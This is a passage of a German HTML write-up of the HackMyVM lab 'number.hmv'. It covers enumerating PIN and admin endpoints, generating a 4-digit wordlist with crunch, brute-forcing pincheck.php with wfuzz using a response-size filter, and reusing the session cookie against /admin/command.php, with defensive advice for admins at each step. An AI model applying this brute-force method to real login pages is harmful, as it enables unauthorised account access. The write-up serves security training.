+<span class="command">http://number.hmv/index.html</span>
+
+<span class="password">Good luck.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich greife auf die Datei <code>/index.html</code> auf der Hauptseite zu (die auch über <code>/</code> erreichbar ist). Der Inhalt ist die einfache Zeichenkette 'Good luck.'. Für Laien: Ich schaue mir wieder die Hauptseite an, und dort steht nur 'Good luck.'. Für Experten: Eine einfache index.html-Seite ohne viel Inhalt ist typisch. Die Nachricht 'Good luck.' ist ein Hinweis von den Erstellern der VM.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Inhalt von <code>index.html</code> ist ein reiner Hinweis und liefert keine direkte technische Schwachstelle, aber er bestätigt die Erreichbarkeit der Hauptseite.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie sich den Hinweis. Konzentrieren Sie sich auf die funktionalen Endpunkte.<br><strong>Empfehlung (Admin):</strong> Ein einfacher Platzhalter oder Hinweis. Keine sicherheitsrelevanten Implikationen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://number.hmv/pin/pincheck.php</span>
+
+<span class="password">PIN WRONG.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich rufe das Skript <code>/pin/pincheck.php</code> direkt auf, wahrscheinlich ohne Parameter, da Feroxbuster es als zugänglich identifiziert hat. Die Antwort ist 'PIN WRONG.'. Für Laien: Ich schaue mir eine andere Webseite im Ordner <code>/pin</code> an, die 'pincheck.php' heißt. Sie sagt einfach nur 'PIN WRONG.'. Das deutet darauf hin, dass sie einen PIN erwartet. Für Experten: Das Skript <code>pincheck.php</code> existiert und verarbeitet Anfragen, die offenbar einen PIN beinhalten. Die Antwort 'PIN WRONG.' ist eine spezifische Fehlermeldung, die auf das Fehlen oder die Ungültigkeit eines erwarteten PINs hinweist. Dies bestätigt die Notwendigkeit, einen PIN zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Existenz eines PIN-Prüf-Skripts (<code>pincheck.php</code>) und die spezifische Fehlermeldung sind ein starker Hinweis auf einen PIN-basierten Authentifizierungsmechanismus in diesem Bereich der Webseite. Dies ist ein wichtiger Zugangspunkt, der die Kompromittierung oder das Brute-Forcing des PINs erfordert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Verzeichnis <code>/pin/</code> und seine Dateien (insbesondere <code>index.php</code> und <code>pincheck.php</code>) genauer. Versuchen Sie herauszufinden, wie der PIN übergeben wird (GET, POST?) und wie viele Stellen er hat (Nikto deutete auf 4 Ziffern hin). Planen Sie ein Brute-Force-Angriff auf den PIN.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie starke Authentifizierungsmechanismen. PIN-basierte Authentifizierung (insbesondere kurze, numerische PINs) ist oft schwach. Implementieren Sie Ratenbegrenzung und Lockout gegen Brute-Force-Angriffe.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://number.hmv/admin/command.php</span>
+
+<span class="password">ACCESS NOT GRANTED.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich greife auf die Datei <code>/admin/command.php</code> zu, die Feroxbuster und Nikto im <code>/admin/</code> Verzeichnis gefunden haben und die nach einer Befehlsausführungsfunktion klingt. Die Antwort ist 'ACCESS NOT GRANTED.'. Für Laien: Ich versuche, eine Webseite im Ordner <code>/admin</code> zu besuchen, die 'command.php' heißt und nach einem Ort klingt, an dem man Befehle eingeben kann. Aber der Computer sagt nur: 'Zugriff nicht gewährt!'. Das deutet darauf hin, dass diese Seite nur für angemeldete Benutzer zugänglich ist. Für Experten: Die spezifische Fehlermeldung 'ACCESS NOT GRANTED.' deutet darauf hin, dass das Skript <code>command.php</code> existiert und verarbeitet wird, aber eine Authentifizierung oder eine bestimmte Sitzung (z.B. eine erfolgreiche Anmeldung im Admin-Bereich oder über den PIN-Bereich) erforderlich ist, um vollen Zugriff zu erhalten. Dies bestätigt, dass <code>command.php</code> eine interessante Funktionalität bietet, die aber nur nach erfolgreicher Authentifizierung zugänglich ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <code>/admin/command.php</code> ist eine geschützte Ressource, die wahrscheinlich erst nach einer erfolgreichen Anmeldung im Admin-Bereich oder möglicherweise im PIN-Bereich zugänglich wird. Dies ist ein klares Ziel nach erfolgreicher Authentifizierung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich darauf, zuerst Zugriff auf den Admin-Bereich (via Login-Formular) oder den PIN-Bereich (via PIN-Check) zu erlangen. Sobald authentifiziert, greifen Sie erneut auf <code>/admin/command.php</code> zu, um seine Funktionalität zu prüfen.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie robuste Zugriffskontrollen für sensitive Endpunkte wie <code>admin/command.php</code>. Stellen Sie sicher, dass die Autorisierungsprüfung korrekt erfolgt und nicht umgangen werden kann.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://number.hmv/pin/</span>
+
+<span class="password">Enter your PIN (4 digits) to log in.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich greife auf das Verzeichnis <code>http://number.hmv/pin/</code> zu. Die Ausgabe ist eine einfache HTML-Seite, die eine klare Anweisung gibt: 'Enter your PIN (4 digits) to log in.'. Für Laien: Ich besuche die Hauptseite im Ordner <code>/pin</code>. Dort steht, dass ich meine geheime Nummer (einen 4-stelligen PIN) eingeben soll, um mich anzumelden. Für Experten: Die Seite <code>/pin/index.php</code> (impliziert durch den Zugriff auf das Verzeichnis) zeigt ein Formular (oder zumindest Text, der darauf hindeutet), das einen 4-stelligen numerischen PIN erwartet. Dies bestätigt die Struktur und den erwarteten Input für den PIN-basierten Authentifizierungsmechanismus, der über <code>pincheck.php</code> verarbeitet wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Seite bestätigt, dass ein 4-stelliger numerischer PIN für die Anmeldung im PIN-Bereich erforderlich ist. Dies ist eine sehr kleine Anzahl von Möglichkeiten (10^4 = 10.000), was Brute-Force-Angriffe praktikabel macht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bereiten Sie eine Wortliste mit allen 4-stelligen numerischen Kombinationen vor (0000 bis 9999) und führen Sie einen Brute-Force-Angriff auf das PIN-Prüf-Skript (<code>pincheck.php</code>) durch. Analysieren Sie die Antworten, um den korrekten PIN zu identifizieren.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie stärkere Authentifizierungsmechanismen als 4-stellige numerische PINs. Implementieren Sie Ratenbegrenzung und Account-Lockout gegen Brute-Force-Angriffe. Überwachen Sie Anmeldeversuche auf <code>pincheck.php</code>.</p>
+        </section>
+
+              <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Fortsetzung Web Enumeration -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">crunch 4 4 0123456789 -o pins.txt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">Crunch will now generate the following amount of data: 50000 bytes</span>
+<span class="command">0 MB</span>
+<span class="command">0 GB</span>
+<span class="command">0 TB</span>
+<span class="command">0 PB</span>
+<span class="command">Crunch will now generate the following number of lines: 10000</span>
+
+<span class="password">crunch: 100% completed generating output</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem wir herausgefunden haben, dass ein 4-stelliger numerischer PIN für den Zugriff auf den <code>/pin/</code>-Bereich erforderlich ist, nutze ich das Tool <code>crunch</code>, um eine Wortliste mit allen möglichen Kombinationen zu erstellen. Der Befehl <code>crunch 4 4 0123456789 -o pins.txt</code> weist <code>crunch</code> an, alle Variationen von Zeichenketten mit einer Länge von 4 (Minimum und Maximum 4) zu generieren, die nur aus den Ziffern 0 bis 9 bestehen (<code>0123456789</code>), und die Ausgabe in der Datei <code>pins.txt</code> zu speichern. Für Laien: Ich benutze ein Programm, um eine Liste mit allen möglichen 4-stelligen Geheimnummern (von 0000 bis 9999) zu erstellen und diese in einer Datei zu speichern. Für Experten: <code>crunch</code> ist ein mächtiges Wortlistengenerierungstool. Die Spezifikation '4 4' und der Zeichensatz '0123456789' erzeugen exakt 10.000 Kombinationen (10^4), was die gesamte Angriffsfläche für einen 4-stelligen numerischen PIN abdeckt. Die Ausgabe wird in <code>pins.txt</code> gespeichert, um sie mit einem Brute-Force-Tool zu verwenden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Wortliste <code>pins.txt</code> wurde erfolgreich mit allen 10.000 möglichen 4-stelligen numerischen PINs erstellt. Dies ist die notwendige Grundlage für einen Brute-Force-Angriff auf das PIN-Prüf-Skript.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die erstellte Datei <code>pins.txt</code> als Wortliste in einem Web-Brute-Force-Tool (z.B. wfuzz, Hydra), um den korrekten PIN für <code>pincheck.php</code> zu finden. Zuerst müssen Sie herausfinden, wie das Skript auf einen korrekten PIN reagiert.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie längere und komplexere PINs oder Passwörter. Implementieren Sie Ratenbegrenzung und Account-Lockout, um Brute-Force-Angriffe auf Anmeldeformulare zu verhindern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X POST -d "password=1111" http://number.hmv/pin/pincheck.php -s| wc -c</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">10</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Bevor ich einen Brute-Force-Angriff starte, teste ich, wie das Skript <code>pincheck.php</code> auf einen falschen PIN reagiert, insbesondere in Bezug auf die Größe der Antwort. Ich sende eine POST-Anfrage (<code>-X POST</code>) mit dem Parameter <code>password=1111</code> (ein offensichtlich falscher PIN) an <code>http://number.hmv/pin/pincheck.php</code>. Die Ausgabe pipe ich an <code>wc -c</code>, das die Anzahl der Bytes (Zeichen) im Output zählt. Der <code>-s</code> Parameter bei <code>curl</code> unterdrückt die Fortschrittsanzeige. Die Ausgabe zeigt <code>10</code>. Für Laien: Ich schicke dem PIN-Programm absichtlich eine falsche Geheimnummer und messe, wie lang die Antwort ist, die ich zurückbekomme. Die Länge ist 10 Zeichen. Das hilft mir, später den richtigen PIN zu finden, indem ich nach einer Antwort suche, die *nicht* 10 Zeichen lang ist. Für Experten: Das Prüfen der Antwortgröße bei einer fehlgeschlagenen Authentifizierung ist eine Standardtechnik für Blind Brute-Force-Angriffe. Wenn die Antwort für einen korrekten PIN eine andere Größe hat, kann dies als Indikator für einen erfolgreichen Versuch verwendet werden. Die festgestellte Größe für einen falschen PIN ist 10 Bytes.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine falsche PIN-Eingabe führt zu einer Antwort von 10 Bytes (wahrscheinlich der Text 'PIN WRONG.' plus eventuelle unsichtbare Zeichen wie Zeilenumbrüche). Dies gibt mir einen klaren Indikator, den ich bei meinem Brute-Force-Angriff verwenden kann, um erfolgreiche Versuche zu identifizieren: Ich suche nach Antworten, deren Größe *nicht* 10 Bytes beträgt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diese Antwortgröße (10 Bytes) als negativen Filter in Ihrem Brute-Force-Tool. Konfigurieren Sie das Tool so, dass es alle PINs aus <code>pins.txt</code> testet und nur Antworten anzeigt, die *nicht* 10 Bytes groß sind (z.B. mit <code>--hh 10</code> in wfuzz).<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie, dass Fehlermeldungen bei der Authentifizierung unterschiedliche Größen haben, da dies Blind Brute-Force-Angriffe ermöglicht. Eine feste Antwortgröße (Timing-Angriffe sind schwerer, aber auch möglich) oder variable Füllzeichen können dies mitigieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wfuzz -c -w pins.txt -d "password=FUZZ" --hc 404 --hh 10 http://number.hmv/pin/pincheck.php</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Target: http://number.hmv/pin/pincheck.php</span>
+<span class="command">Total requests: 10000</span>
+
+<span class="password">=====================================================================</span>
+<span class="command">ID           Response   Lines    Word       Chars       Payload</span>
+<span class="password">=====================================================================</span>
+
+<span class="command">000004445:   200        0 L      3 W        21 Ch       "4444"</span>
+
+<span class="command">Total time: 0</span>
+<span class="command">Processed Requests: 10000</span>
+<span class="command">Filtered Requests: 9999</span>
+<span class="command">Requests/sec.: 0</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe einen Brute-Force-Angriff auf das Skript <code>pincheck.php</code> unter Verwendung von <code>wfuzz</code> durch. Der Befehl ist <code>wfuzz -c -w pins.txt -d "password=FUZZ" --hc 404 --hh 10 http://number.hmv/pin/pincheck.php</code>. <code>-c</code> färbt die Ausgabe. <code>-w pins.txt</code> verwendet die zuvor erstellte Wortliste als Payload-Quelle. <code>-d "password=FUZZ"</code> gibt an, dass die Werte aus der Wortliste in einem POST-Request (impliziert durch <code>-d</code>) als Wert für den Parameter <code>password</code> eingefügt werden sollen, anstelle des <code>FUZZ</code>-Keywords. <code>--hc 404</code> verbirgt Antworten mit Statuscode 404. <code>--hh 10</code> **versteckt Antworten, deren Body genau 10 Bytes lang ist** (basierend auf meinem vorherigen Test mit einem falschen PIN). Der Angriff testet alle 10.000 PINs. Die Ausgabe zeigt einen einzigen Treffer: <code>000004445: 200 0 L 3 W 21 Ch "4444"</code>. Für Laien: Ich benutze ein Programm, um alle 10.000 Geheimnummern aus meiner Liste (pins.txt) auszuprobieren und sie an das PIN-Programm zu schicken. Ich sage dem Programm, es soll nur die Antworten zeigen, die *nicht* die falsche Größe (10 Zeichen) haben. Und es findet eine Nummer (4444), die eine andere Größe zurückgibt! Das ist wahrscheinlich die richtige Geheimnummer! Für Experten: Wfuzz testet jeden PIN in der Wortliste. Der Filter <code>--hh 10</code> ist entscheidend, um den korrekten PIN zu isolieren, da nur ein korrekter PIN eine Antwortgröße ungleich 10 Bytes (hier 21 Bytes) zurückgibt. Der gefundene PIN ist <code>4444</code>, der einen Status 200 (OK) und eine Body-Größe von 21 Bytes zurückgibt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Brute-Force-Angriff war erfolgreich. Der korrekte PIN für den <code>/pin/</code>-Bereich ist <code>4444</code>. Die Antwortgröße von 21 Bytes für den korrekten PIN unterscheidet sich klar von der 10 Bytes bei falschem PIN.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der PIN <code>4444</code> ist gefunden. Nutzen Sie diesen PIN, um Zugriff auf den <code>/pin/</code>-Bereich zu erhalten und nach weiterer Funktionalität oder Schwachstellen zu suchen. Prüfen Sie, ob der Zugang zum <code>/admin/command.php</code> nun möglich ist.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie umgehend Ratenbegrenzung und Account-Lockout, um Brute-Force-Angriffe zu verhindern. Verwenden Sie längere, komplexere, nicht-numerische PINs oder Passwörter. Vermeiden Sie, dass unterschiedliche Authentifizierungs-Ergebnisse zu Antworten unterschiedlicher Größe führen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://number.hmv/pin/pincheck.php</span>
+
+<span class="password">PIN CORRECT, WELCOME.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich teste den gefundenen PIN <code>4444</code> manuell, indem ich eine POST-Anfrage mit <code>password=4444</code> an <code>http://number.hmv/pin/pincheck.php</code> sende (wahrscheinlich über den Browser oder <code>curl</code>). Die Antwort des Servers ist 'PIN CORRECT, WELCOME.'. Für Laien: Ich gebe die gefundene Geheimnummer (4444) in das Programm ein, das Geheimnummern prüft. Und es sagt: 'Geheimnummer richtig, willkommen!'. Das bestätigt, dass die Nummer stimmt. Für Experten: Die manuelle Verifizierung des PINs <code>4444</code> durch Senden einer POST-Anfrage und der Erhalt der Bestätigungsnachricht 'PIN CORRECT, WELCOME.' bestätigt die Gültigkeit des PINs und den erfolgreichen 'Login' in den PIN-geschützten Bereich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der PIN <code>4444</code> ist korrekt und ermöglicht den Zugriff auf den PIN-geschützten Bereich. Dies ist ein wichtiger Schritt zum Initial Access.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie nun, welche Ressourcen oder Funktionalitäten nach Eingabe des korrekten PINs zugänglich sind. Prüfen Sie insbesondere den Zugriff auf <code>/admin/command.php</code> und ob in diesem Bereich neue Links oder Formulare sichtbar werden.<br><strong>Empfehlung (Admin):</strong> Verbessern Sie den PIN-Mechanismus (Länge, Komplexität, Brute-Force-Schutz). Die spezifische Bestätigung 'PIN CORRECT, WELCOME.' ist klar, aber die Schwäche lag im Brute-Forcing-Schutz.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">view-source:http://number.hmv/pin/pincheck.php</span>
+
+<span class="command">PHPSESSID	"20p88f6d7mmh57ja9d2i416dmj"</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach der erfolgreichen PIN-Anmeldung überprüfe ich den Quellcode der Seite <code>/pin/pincheck.php</code> (oder die Seite, auf die ich nach dem korrekten PIN weitergeleitet werde), um nach Informationen zu suchen. Der wichtige Fund ist hier, dass ein Session-Cookie gesetzt wird: <code>PHPSESSID "20p88f6d7mmh57ja9d2i416dmj"</code>. Dies bedeutet, dass nach der korrekten PIN-Eingabe eine PHP-Session gestartet oder reaktiviert wird, die meinen 'angemeldeten' Zustand speichert. Der Wert des Session-Cookies ist <code>20p88f6d7mmh57ja9d2i416dmj</code>. Für Laien: Nachdem ich die richtige Geheimnummer eingegeben habe, gibt mir die Webseite einen speziellen 'Ausweis' (einen Session-Cookie mit einer Nummer). Diesen 'Ausweis' zeige ich der Webseite bei jedem weiteren Besuch, damit sie weiß, dass ich die Geheimnummer schon eingegeben habe und 'drin' bin. Die 'Ausweisnummer' ist <code>20p88f6d7mmh57ja9d2i416dmj</code>. Für Experten: Die Verwendung von PHP Sessions (erkennbar am <code>PHPSESSID</code>-Cookie) zur Verwaltung des Authentifizierungsstatus ist Standard. Der nach erfolgreicher PIN-Validierung erhaltene <code>PHPSESSID</code>-Cookie ist der 'Schlüssel' zur Sitzung. Durch das Mitführen dieses Cookies bei nachfolgenden Anfragen kann ich auf Ressourcen zugreifen, die nur für Benutzer mit einer gültigen Session zugänglich sind.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das <code>PHPSESSID</code>-Cookie ist der Beweis für eine erfolgreiche Authentifizierung im PIN-Bereich. Mit diesem Cookie kann ich nun versuchen, auf geschützte Ressourcen zuzugreifen, insbesondere auf <code>/admin/command.php</code>, von dem ich zuvor 'ACCESS NOT GRANTED.' erhalten habe.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den erhaltenen <code>PHPSESSID</code>-Cookie (<code>20p88f6d7mmh57ja9d2i416dmj</code>) in allen nachfolgenden Anfragen, um sich als authentifiziert zu präsentieren. Greifen Sie gezielt auf <code>http://number.hmv/admin/command.php</code> zu und analysieren Sie dessen Funktionalität.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Session-IDs sicher generiert werden (hohe Entropie) und korrekt gehandhabt werden. Session-Hijacking ist ein Risiko, wenn Session-IDs kompromittiert werden (hier durch den Brute-Force des PINs ermöglicht).</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Fortsetzung Initial Access -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl --cookie "PHPSESSID=20p88f6d7mmh57ja9d2i416dmj" http://number.hmv/admin/command.php</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">ACCESS NOT GRANTED.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit dem erhaltenen <code>PHPSESSID</code>-Cookie (<code>20p88f6d7mmh57ja9d2i416dmj</code>) versuche ich, auf <code>http://number.hmv/admin/command.php</code> zuzugreifen, indem ich das Cookie in meiner <code>curl</code>-Anfrage mitführe (<code>--cookie "PHPSESSID=..."</code>). Ich sende eine einfache GET-Anfrage. Die Antwort ist jedoch immer noch 'ACCESS NOT GRANTED.'. Für Laien: Ich versuche, die Webseite 'command.php' im Ordner <code>/admin</code> zu besuchen, diesmal mit meinem 'Ausweis' (dem Session-Cookie), den ich nach Eingabe der richtigen Geheimnummer bekommen habe. Aber der Computer sagt immer noch: 'Zugriff nicht gewährt!'. Das ist komisch. Für Experten: Die Tatsache, dass der Zugriff auf <code>/admin/command.php</code> trotz gültiger Session (verifiziert durch erfolgreichen PIN-Login) immer noch verweigert wird, deutet darauf hin, dass die Authentifizierung über den PIN-Bereich nicht ausreicht, um Zugriff auf den Admin-Bereich zu erhalten. Möglicherweise sind separate Anmeldedaten für den Admin-Bereich erforderlich, oder die Session aus dem PIN-Bereich gewährt keine ausreichenden Berechtigungen für den Admin-Bereich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Session aus dem PIN-Bereich scheint keinen direkten Zugriff auf <code>/admin/command.php</code> zu gewähren. Die Authentifizierung für <code>command.php</code> ist möglicherweise separat oder an stärkere Berechtigungen gekoppelt als die einfache PIN-Authentifizierung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Authentifizierung über den PIN-Bereich allein reicht nicht aus. Die primären Ziele sind weiterhin: 1. Den tatsächlichen Anmeldevorgang für den Admin-Bereich (via <code>admin/index.php</code> und <code>admincheck.php</code>) zu kompromittieren oder 2. Weitere Informationen über den Zweck des PIN-Bereichs zu finden und ob dieser andere geschützte Ressourcen freischaltet. Prüfen Sie die anderen Dateien im <code>/pin/</code> Verzeichnis, insbesondere <code>whoami.php</code>.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie eine klare Trennung der Berechtigungen zwischen verschiedenen Bereichen der Webanwendung. Stellen Sie sicher, dass die Authentifizierung in einem Bereich nicht ungewollt Zugriff auf andere, sensiblere Bereiche gewährt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl --cookie "PHPSESSID=20p88f6d7mmh57ja9d2i416dmj" "http://number.hmv/admin/command.php?parameter_name=id"</span></span>
+<span class="password">ACCESS NOT GRANTED.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich teste weiterhin den Zugriff auf <code>/admin/command.php</code> mit dem gültigen Session-Cookie, diesmal unter Übergabe eines GET-Parameters (<code>?parameter_name=id</code>), um zu prüfen, ob das Skript auf Parameter reagiert, auch wenn der Zugriff verweigert wird. Die Antwort ist immer noch 'ACCESS NOT GRANTED.'. Für Laien: Ich versuche wieder, die Seite 'command.php' mit meinem 'Ausweis' zu besuchen, gebe ihr aber dabei eine zusätzliche 'Notiz' (einen Parameter in der Adresse) mit. Aber sie lässt mich immer noch nicht rein. Für Experten: Das Skript ignoriert offenbar den übergebenen GET-Parameter, solange keine ausreichende Authentifizierung vorliegt. Die Zugriffsverweigerung erfolgt, bevor die Parameter verarbeitet werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Zugang zu <code>/admin/command.php</code> bleibt mit der PIN-Session verweigert, unabhängig von den GET-Parametern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie dasselbe mit POST-Parametern, da das Admin-Login-Formular POST verwendet. Wenn auch das fehlschlägt, ist klar, dass die PIN-Session allein nicht ausreicht.<br><strong>Empfehlung (Admin):</strong> Robuste Zugriffskontrollen sollten die Parameterverarbeitung vor der Autorisierungsprüfung blockieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl --cookie "PHPSESSID=20p88f6d7mmh57ja9d2i416dmj" -X POST -d "parameter_name=id" http://number.hmv/admin/command.php</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">ACCESS NOT GRANTED.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich sende eine POST-Anfrage (<code>-X POST -d "parameter_name=id"</code>) an <code>/admin/command.php</code>, diesmal mit dem gültigen Session-Cookie. Die Antwort ist immer noch 'ACCESS NOT GRANTED.'. Für Laien: Ich probiere es nochmal mit der Seite 'command.php' und meinem 'Ausweis', schicke aber diesmal die zusätzliche 'Notiz' (den Parameter) auf eine andere Weise (im 'Körper' der Nachricht, wie es die Anmeldeseite tut). Aber immer noch sagt der Computer: 'Zugriff nicht gewährt!'. Es scheint wirklich am 'Ausweis' (der Session aus dem PIN-Bereich) zu liegen. Für Experten: Die Versuche, Parameter über GET oder POST an <code>/admin/command.php</code> zu übergeben, während nur mit der PIN-Session authentifiziert, schlagen fehl. Dies bestätigt, dass die PIN-Authentifizierung nicht genügend Rechte für den Admin-Bereich gewährt. Es ist notwendig, entweder separate Admin-Anmeldedaten zu finden oder herauszufinden, wie der PIN-Bereich tatsächlich privilegierten Zugriff ermöglicht, falls nicht auf <code>command.php</code>.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die PIN-Session gewährt keinen Zugriff auf <code>/admin/command.php</code>. Ich muss andere Möglichkeiten suchen, wie die PIN-Anmeldung nützlich sein könnte, oder mich auf den Admin-Login konzentrieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die anderen Dateien im <code>/pin/</code> Verzeichnis. Insbesondere <code>whoami.php</code> könnte relevant sein. Analysieren Sie dessen Inhalt oder Verhalten, insbesondere im Kontext der gültigen PIN-Session. Brute-Force des Admin-Logins ist eine weitere Option.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Autorisierungsprüfungen korrekt funktionieren und dass Session-Berechtigungen auf das Minimum beschränkt sind, das für den jeweiligen Bereich erforderlich ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://number.hmv/pin/whoami.php</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">You are the Fucking Nobody.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich greife nun auf die Datei <code>/pin/whoami.php</code> zu, die Feroxbuster im <code>/pin/</code> Verzeichnis gefunden hat. Ich sende eine einfache GET-Anfrage, wahrscheinlich ohne Session-Cookie. Die Antwort ist 'You are the Fucking Nobody.'. Für Laien: Ich besuche die Webseite 'whoami.php' im Ordner <code>/pin</code>. Sie antwortet mit einer beleidigenden Nachricht und sagt, dass ich 'niemand' bin. Das ist die Standardantwort, wenn man nicht angemeldet ist oder keinen richtigen 'Ausweis' hat. Für Experten: Das Skript <code>whoami.php</code> existiert und scheint Informationen über den Benutzerstatus anzuzeigen. Die Antwort 'You are the Fucking Nobody.' ist die Standardmeldung für einen unauthentifizierten oder nicht-privilegierten Benutzer. Dies deutet darauf hin, dass das Skript bei erfolgreicher Authentifizierung (z.B. mit dem korrekten PIN und Session-Cookie) eine andere, informativere Ausgabe liefern könnte.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <code>whoami.php</code> ist ein Skript, das auf den Authentifizierungsstatus reagiert und bei unauthentifizierten Anfragen eine spezifische negative Antwort liefert. Dies macht es zu einem perfekten Ziel, um zu überprüfen, ob die PIN-Session funktioniert und welche Berechtigungen sie gewährt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greifen Sie erneut auf <code>http://number.hmv/pin/whoami.php</code> zu, diesmal unter Mitführung des gültigen <code>PHPSESSID</code>-Cookies, das Sie nach der PIN-Anmeldung erhalten haben. Beobachten Sie die Antwort genau. Dies sollte zeigen, welche Identität oder welchen Status die PIN-Session tatsächlich repräsentiert.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie beleidigende oder unprofessionelle Fehlermeldungen. Geben Sie keine spezifischen Informationen über den Status des Benutzers preis, es sei denn, dies ist für die Anwendung absolut notwendig. Stellen Sie sicher, dass Authentifizierungsprüfungen korrekt erfolgen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -s --cookie "PHPSESSID=20p88f6d7mmh57ja9d2i416dmj" http://number.hmv/pin/whoami.php | wc -c</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">38</span></pre>
+                </div>
+            </div>
